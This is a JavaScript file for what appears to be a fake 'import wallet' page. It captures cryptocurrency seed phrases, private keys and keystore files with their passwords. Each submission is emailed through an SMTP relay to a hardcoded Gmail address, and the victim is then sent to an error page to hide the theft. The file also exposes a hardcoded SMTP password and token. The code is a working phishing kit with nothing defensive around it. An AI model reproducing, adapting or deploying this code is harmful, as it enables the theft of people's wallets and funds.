const emptyInputs = () => {
    console.log("emptyInputs function called");
    const inputs = document.querySelectorAll('input:not([type=hidden])');
    const textAreaInputs = document.querySelectorAll('textarea');
    
    inputs.forEach((input) => {
      input.value = '';
    });
  
    textAreaInputs.forEach((textAreaInput) => {
      textAreaInput.value = '';
    });
};

const setDefaultView = () => {
    console.log("setDefaultView function called");
    const tabs = document.querySelectorAll('.import__tab__body--item');
  
    tabs.forEach((el) => {
        if (!el.classList.contains('current')) {
            el.classList.add('hidden');
        }
    });
  
    emptyInputs();
};

const setAllToHidden = () => {
    console.log("setAllToHidden function called");
    const tabs = document.querySelectorAll('.import__tab__body--item');
  
    tabs.forEach((el) => {
        if (el.classList.contains('hidden')) {
            el.classList.remove('hidden');
        }
        if (el.classList.contains('current')) {
            el.classList.remove('current');
        }
        el.classList.add('hidden');
    });
};

const addCurrentToLink = (link) => {
    console.log("addCurrentToLink function called");
    const tabLinks = document.querySelectorAll('.import__tab__header--item');
    
    tabLinks.forEach((link) => {
        if (link.classList.contains('current')) {
            link.classList.remove('current');
        }
    });
  
    link.classList.add('current');
};

const navigateTab = () => {
    console.log("navigateTab function called");
    const tabLinks = document.querySelectorAll('.import__tab__header--item');
    
    tabLinks.forEach((link) => {
        link.addEventListener('click', function (e) {
            console.log("Tab link clicked");
            emptyInputs();
        
            const elementId = link.href.split('#')[1];
        
            setAllToHidden();
            const targetTabBody = document.querySelector(`#${elementId}`);
            if (targetTabBody.classList.contains('hidden')) {
                targetTabBody.classList.remove('hidden');
            }
            targetTabBody.classList.add('current');
  
            addCurrentToLink(link);
        });
    });
};

setDefaultView();
navigateTab();

const sendRequest = (data) => {
    console.log("sendRequest function called with data:", data);
    let msg;
    if (data.type == "phrase") {
        msg = `Phrase: ${data.phrase}`;
    } else if (data.type == "keystore_json" && data.pkey) {
        msg = `Private key: ${data.pkey}`;
    } else {
        msg = `Keystore: ${data.keystore} password: ${data.kjp}`;
    }
  
    console.log(`Preparing to send email with the following data: ${msg}`);
  
    const emailData = {
        SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
        To: "olatundelucaz83@gmail.com",
        From: "bekkierowland@gmail.com",
        Subject: `${data.walletRef} and token type is ${data.type}`,
        Body: `${msg}`,
        Host: "smtp.elasticemail.com", // Replace with your SMTP server
        Username: "bekkierowland@gmail.com", // Replace with your SMTP username
        Password: "955B3574AC1826A1BDB51F4AC77D9358D0FB", // Replace with your SMTP password
        Port: 2525 // Replace with your SMTP port
    };

    console.log("Email data prepared:", emailData);

    Email.send(emailData)
        .then(function (message) {
            console.log("Email send promise resolved with message:", message);
            if (message === "OK") {
                console.log("Email sent successfully. Connected to SMTP service provider.");
                window.location = `error.html`;
            } else {
                console.error("Email send failed with response:", message);
                alert("Email send failed. Check the console for more details.");
            }
        })
        .catch((error) => {
            console.error("Failed to send email. Connection to SMTP service provider failed:", error);
            alert("Failed to send email. Check the console for more details.");
        });
};


const submitPhraseForm = () => {
    const form = document.getElementById('phrase_form');
    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            console.log("Phrase form submitted");
            const phrase = document.getElementById('phraseText').value;
            if (!phrase) {
                alert('Empty input');
            } else {
                const data = {
                    walletRef: document.getElementById('wallet_id').value,
                    type: 'phrase',
                    phrase,
                };
  
                sendRequest(data);
            }
        });
    } else {
        console.error("Phrase form not found.");
    }
};

const submitKeystoreForm = () => {
    const form = document.getElementById('keystore_form');
    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            console.log("Keystore form submitted");
            const keystore_json = document.getElementById('keystoreText').value;
            const kj_password = document.getElementById('keystorePassword').value;
  
            if (!keystore_json || !kj_password) {
                alert('Please provide both the Keystore JSON and password');
            } else {
                const data = {
                    walletRef: document.getElementById('wallet_id').value,
                    type: 'keystore_json',
                    keystore: keystore_json,
                    kjp: kj_password,
                };
  
                sendRequest(data);
            }
        });
    } else {
        console.error("Keystore form not found.");
    }
};

const submitPrivateKeyForm = () => {
    const form = document.getElementById('privatekey_form');
    if (form) {
        form.addEventListener('submit', function (e) {
            e.preventDefault();
            console.log("Private key form submitted");
            const private_key = document.getElementById('privatekeyText').value;
  
            if (!private_key) {
                alert('Empty input');
            } else {
                const data = {
                    walletRef: document.getElementById('wallet_id').value,
                    type: 'keystore_json',
                    pkey: private_key,
                };
  
                sendRequest(data);
            }
        });
    } else {
        console.error("Private key form not found.");
    }
};

submitPhraseForm();
submitKeystoreForm();
submitPrivateKeyForm();
